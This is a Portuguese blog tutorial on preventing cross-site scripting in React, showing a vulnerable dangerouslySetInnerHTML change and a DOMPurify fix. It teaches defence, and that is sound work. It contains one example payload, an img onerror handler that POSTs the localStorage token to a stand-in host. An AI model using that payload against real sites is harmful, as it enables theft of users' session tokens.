---
layout: default
title: Como se prevenir de ataques Cross-Site Scripting (XSS)
tags:
  - seguranca
  - javascript
  - frontend
date: 2024-12-28T10:18:00.000Z
---
Ataques Cross-Site Scripting (XSS) são uma das vulnerabilidades mais comuns e perigosas em aplicações web. Neste guia, você aprenderá o que é XSS, como ele funciona, e como proteger seu código contra esses ataques. Vamos mergulhar em um exemplo prático e aprender soluções eficazes usando bibliotecas como `DOMPurify`.

## O que é um ataque Cross-Site Scripting (XSS)?

Um ataque XSS ocorre quando invasores injetam scripts maliciosos em páginas da web visualizadas por outros usuários. Esses scripts podem contornar a mesma política de origem, permitindo que o invasor:

* Roube dados sensíveis (como tokens de sessão);
* Sequestre sessões de usuários;
* Desfigure websites;
* Espalhe malwares.

Entender como essas brechas surgem é o primeiro passo para preveni-las.

## Exemplo prático de vulnerabilidade XSS

Vamos analisar um exemplo de código React vulnerável a XSS:

```jsx
const Page = () => {
  const [content, setContent] = useState('');

  const handleSubmit = (event) => {
    event.preventDefault();
    const formData = new FormData(event.currentTarget);
    const content = formData.get('content');
    setContent(content);
  }

  return (
    <>
      <form onSubmit={handleSubmit}>
        <textarea name="content"></textarea>
        <input type="submit" value="Save" />
      </form>
      <p>{content}</p>
    </>
  );
}
```

### Problema: Renderização perigosa de HTML

Se um usuário digitar HTML no campo de texto e clicar em "Save", o conteúdo será exibido como texto puro. No entanto, se alterarmos a forma como o conteúdo é renderizado, o código torna-se vulnerável:

```diff
- <p>{content}</p>
+ <p dangerouslySetInnerHTML={{ __html: content }} />
```

Agora, qualquer código HTML será interpretado e renderizado, incluindo scripts maliciosos.

### Exemplo de Ataque

Se um invasor inserir o seguinte código no campo de texto:

```html
<img src=?? onerror="fetch('https:\/\/xss.com', { method: 'POST', body: localStorage.getItem('token') })">
```

O atributo `onerror` executa um script caso o atributo `src` falhe. Dessa forma, o invasor pode enviar os dados para um servidor externo.

Este é um exemplo de como XSS pode ser usado para roubar informações sensíveis de usuários.

## Solução: Sanitizando o conteúdo com `DOMPurify`

Para evitar vulnerabilidades XSS, precisamos limpar o conteúdo antes de renderizá-lo. Uma biblioteca popular para isso é a `DOMPurify`.

### Instalando a Biblioteca

Adicione a dependência ao seu projeto:

```
npm i dompurify
```

### Importando e Usando `DOMPurify`

Substitua a renderização perigosa pelo seguinte código:

```jsx
import DOMPurify from 'dompurify';

const sanitizedContent = DOMPurify.sanitize(content);

<p dangerouslySetInnerHTML={{ __html: sanitizedContent }} />
```

Agora, qualquer script malicioso será removido automaticamente antes da renderização.

## Conclusão

Ataques XSS podem ter consequências graves para seus usuários e aplicações. No entanto, com medidas simples como o uso de `DOMPurify`, é possível proteger seu código de forma eficaz.

Certifique-se de sempre sanitizar conteúdo dinâmico antes de renderizá-lo. Compartilhe este artigo com outros desenvolvedores para ajudar a criar aplicações mais seguras!
